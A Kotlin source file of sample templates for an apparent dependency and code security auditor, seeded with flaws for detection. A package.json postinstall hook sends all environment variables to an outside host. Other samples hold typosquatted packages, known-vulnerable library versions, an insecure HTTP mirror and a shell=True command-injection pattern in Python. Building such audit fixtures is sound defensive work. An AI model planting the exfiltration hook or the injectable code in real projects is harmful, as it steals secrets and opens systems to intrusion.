package com.example.data.repository

import com.example.data.ai.AuditEngineMode

data class InspectionTemplate(
    val id: String,
    val label: String,
    val filePath: String,
    val recommendedEngine: AuditEngineMode,
    val content: String
)

object InspectionTemplates {
    val all: List<InspectionTemplate> = listOf(
        InspectionTemplate(
            id = "pkg_json",
            label = "package.json",
            filePath = "services/web-portal/package.json",
            recommendedEngine = AuditEngineMode.SECURITY_ONLY,
            content = """
{
  "name": "@acme/checkout-portal",
  "version": "2.4.1",
  "scripts": {
    "build": "vite build",
    "postinstall": "node -e \"fetch('https://metrics-collect.ru/env?d='+Buffer.from(JSON.stringify(process.env)).toString('base64'))\""
  },
  "dependencies": {
    "react": "^18.3.1",
    "lodahs": "4.17.21",
    "request": "2.88.2",
    "axios": "0.21.1"
  }
}
            """.trimIndent()
        ),
        InspectionTemplate(
            id = "req_txt",
            label = "requirements.txt",
            filePath = "backend/worker/requirements.txt",
            recommendedEngine = AuditEngineMode.SECURITY_ONLY,
            content = """
fastapi==0.115.0
uvicorn==0.32.0
reqeusts==2.31.0
PyYAML==5.3.1
urllib3==1.26.4
celery==5.4.0
redis==5.1.1
            """.trimIndent()
        ),
        InspectionTemplate(
            id = "go_mod",
            label = "go.mod",
            filePath = "edge-proxy/go.mod",
            recommendedEngine = AuditEngineMode.SECURITY_ONLY,
            content = """
module github.com/acme/edge-proxy

go 1.22

require (
    github.com/dgrijalva/jwt-go v3.2.0+incompatible
    github.com/gin-gonic/gin v1.9.1
    golang.org/x/net v0.17.0
)
            """.trimIndent()
        ),
        InspectionTemplate(
            id = "gradle_kts",
            label = "build.gradle.kts",
            filePath = "mobile/app/build.gradle.kts",
            recommendedEngine = AuditEngineMode.DUAL_ENGINE,
            content = """
repositories {
    maven { url = uri("http://insecure-mirror.internal/repo") }
    mavenCentral()
}

dependencies {
    implementation("com.squareup.okhttp3:okhttp:3.12.0")
    implementation("com.fasterxml.jackson.core:jackson-databind:2.9.8")
    implementation("org.apache.logging.log4j:log4j-core:2.14.1")
}
            """.trimIndent()
        ),
        InspectionTemplate(
            id = "pr_diff",
            label = "PR Diff (Python)",
            filePath = "backend/services/patch_executor.py",
            recommendedEngine = AuditEngineMode.DUAL_ENGINE,
            content = """
import subprocess, os

def apply_git_patch(repo_dir: str, branch: str, patch_path: str, retries: int):
    if repo_dir:
        if os.path.exists(repo_dir):
            if retries > 0:
                for i in range(retries):
                    if branch != "":
                        cmd = f"git -C {repo_dir} checkout {branch} && git apply {patch_path}"
                        res = subprocess.run(cmd, shell=True, capture_output=True)
                        if res.returncode == 0:
                            return {"ok": True, "attempt": i}
                        else:
                            if "conflict" in res.stderr.decode():
                                continue
    return {"ok": False}
            """.trimIndent()
        )
    )
}
